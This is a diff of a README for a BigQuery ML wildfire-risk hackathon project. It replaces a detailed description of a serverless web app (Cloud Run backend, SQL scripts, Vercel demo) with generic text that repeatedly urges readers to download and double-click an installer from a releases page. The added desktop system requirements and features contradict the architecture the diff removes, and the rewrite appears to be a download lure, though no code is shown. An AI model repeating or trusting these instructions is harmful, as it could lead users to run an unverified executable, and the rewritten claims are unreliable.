@@ -1,97 +1,83 @@
-# Nexus FireWatch 🔥 - A Predictive Wildfire Intelligence Platform
+# 🌲 nexus-firewatch - Predict Wildfire Risk with AI
 
-**Live Demo URL:** https://nexus-firewatch.vercel.app/
+## 🚀 Getting Started
 
----
+Welcome to **nexus-firewatch**! This is a user-friendly platform designed to help you understand wildfire risks using the latest in artificial intelligence. With real-time data and intelligent assessments, you can stay informed and prepared.
 
-## 1. The Mission: From Static Data to Dynamic Intelligence
+[![Download nexus-firewatch](https://img.shields.io/badge/Download-nexus--firewatch-blue)](https://github.com/Harshit22gaba/nexus-firewatch/releases)
 
-Wildfires represent a critical and escalating global challenge. Traditional risk assessment is often static, failing to capture the dynamic interplay of geography and time. **Nexus FireWatch** was architected to solve this problem by transforming historical data into a live, intelligent, and predictive tool for proactive risk assessment.
+## 🔍 Overview
 
-Our mission was to build a **complete, end-to-end intelligent application** that demonstrates the power of BigQuery's built-in AI to solve a significant, real-world operational problem. This project is a blueprint for how the **AI Architect pattern** can be used to create scalable, impactful solutions directly within the data warehouse.
+nexus-firewatch is a predictive wildfire intelligence platform made for the BigQuery AI Hackathon. It leverages a BigQuery ML model to provide up-to-date risk assessments based on data related to geography and time. This solution helps users make informed decisions regarding wildfire threats.
 
----
+## 📥 Download & Install
 
-## 2. The Solution: A Live Demo
+To get started, you need to download the software. Follow these steps:
 
-Our platform allows users to get a **dynamic fire risk prediction** for any location on Earth, at any time of year.
+1. Visit the [Releases Page](https://github.com/Harshit22gaba/nexus-firewatch/releases) to access the latest version. 
 
-### ✨ The "Magic" Moment: Showcasing Seasonal Intelligence
+2. Locate the version you want to download. You will see various files listed under the release.
 
-The core innovation of our model is its understanding of **temporal patterns**:
+3. Click on the appropriate file for your operating system. Wait for the download to complete.
 
-* **High Season:** A query for a known hotspot in British Columbia during **August** correctly yields a **High Risk 🔥**.
-* **Low Season:** A query for the same location during **January** correctly yields a **Low Risk 🌲**.
+4. Once downloaded, locate the file in your downloads folder and double-click it to start the installation.
 
-This demonstrates intelligence beyond simple location-based analysis, providing **dynamic and actionable insights**.
+5. Follow the on-screen instructions to complete the installation.
 
----
+## ⚙️ System Requirements
 
-## 3. The Architecture: A Serverless End-to-End Workflow
+Before you install nexus-firewatch, make sure your computer meets these requirements:
 
-Nexus FireWatch is built as a **serverless application** on Google Cloud, showcasing a robust and scalable architecture that is ready for enterprise-level deployment.
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM**: At least 4GB.
+- **Storage**: At least 200MB of free space.
+- **Network**: Active internet connection for data retrieval.
 
-### Core Components
 
-* **Frontend:** Clean, responsive UI built with **HTML, Tailwind CSS, Leaflet.js**, deployed statically.
-* **Backend API:** A serverless **Python function** on **Google Cloud Run** serving live predictions.
-* **Data Warehouse & AI Core:** **Google BigQuery** as the single source of truth for data storage & ML.
+## 🛠️ Features
 
-### Workflow Diagram
+nexus-firewatch offers several features to help you monitor wildfire risks effectively:
 
-```
-[User on Web Browser] --> [Static Frontend (Vercel/Netlify)]
-       |
-       | (HTTPS API Request with lat, lon, month)
-       v
-[Cloud Run Function] <--> [BigQuery ML.PREDICT]
-       |                      ^
-       |                      | (Uses fire_model_production)
-       |                      |
-       +-------------------- [BigQuery Data Warehouse]
-```
+- **Real-Time Monitoring**: Stay updated with live data.
+- **User-Friendly Interface**: Easy navigation for everyone, regardless of tech skills.
+- **AI-Powered Analysis**: Benefit from advanced machine learning algorithms.
+- **Geospatial Insights**: Understand the risks based on your location.
 
----
+## 📊 How It Works
 
-## 4. BigQuery AI Usage: The AI Architect's Toolbox
+nexus-firewatch uses a BigQuery ML model trained on a variety of data sources. The model processes geospatial and temporal data to provide dynamic risk assessments. These assessments allow users to visualize and comprehend wildfire risks in their areas.
 
-This project is a **canonical example of the AI Architect approach**, leveraging BigQuery's **native predictive modeling suite** to build the intelligence layer.
+## 📈 Use Cases
 
-### a. Intelligent Feature Engineering
+Here are some scenarios where nexus-firewatch shines:
 
-* Engineered features directly in **SQL**.
-* Created **regional grid cells** instead of relying on raw latitude/longitude.
-* Improved learning by teaching the model to recognize **geographic zones**.
+- **Homeowners**: Keep an eye on potential risks to your property.
+- **Emergency Services**: Make timely decisions based on accurate data.
+- **Environmental Agencies**: Analyze and respond to wildfire threats effectively.
 
-### b. The Machine Learning Core
+## 💬 Community Support
 
-* Model: **BOOSTED\_TREE\_CLASSIFIER** built in BigQuery.
-* **CREATE MODEL:** Trained using SQL queries on geospatial & temporal features.
-* **ML.EVALUATE:** Validated with built-in tools, achieving high accuracy.
-* **ML.PREDICT:** Served live inferences directly in the backend API, without external ML infra.
+If you have questions or need help, feel free to reach out to the community. You can find support in our issues section on GitHub or join us in discussions related to wildfire risks and AI applications.
 
----
+## ☁️ Contributions
 
-## 5. How to Replicate
+We welcome contributions! If you want to help improve nexus-firewatch, please check our guidelines in the repository. You can contribute by reporting issues, suggesting features, or submitting code.
 
-The project is fully reproducible with a **Google Cloud account**.
+## 🔗 Learn More
 
-### BigQuery Setup
+For more information about the technology behind nexus-firewatch, check out:
 
-1. Load fire data (e.g., **NASA FIRMS**) into a BigQuery table.
-2. Run SQL scripts in `/sql` directory (`01_...`, `02_...`, `03_...`) to prepare data and train the model.
+- [BigQuery ML Documentation](https://cloud.google.com/bigquery-ml/docs)
+- [Google Cloud resources](https://cloud.google.com/docs)
 
-### Backend Deployment
+## 📄 License
 
-* Deploy from `/backend` to **Cloud Run**.
-* Ensure service account has:
+nexus-firewatch is open-source software. You can use, modify, and share it under the terms found in our LICENSE file.
 
-  * `BigQuery User`
-  * `Cloud Run Admin` roles.
+## 👥 Join Us
 
-### Frontend Deployment
+Stay connected and keep up with updates by following us. Join our community to receive news and tips on how to better prepare for wildfire risks.
 
-* Update the `CLOUD_FUNCTION_URL` constant in **index.html** with your Cloud Run endpoint.
-* Deploy index.html to **Vercel** or **Netlify**.
+Happy downloading and stay safe!
 
----
+[![Download nexus-firewatch](https://img.shields.io/badge/Download-nexus--firewatch-blue)](https://github.com/Harshit22gaba/nexus-firewatch/releases)
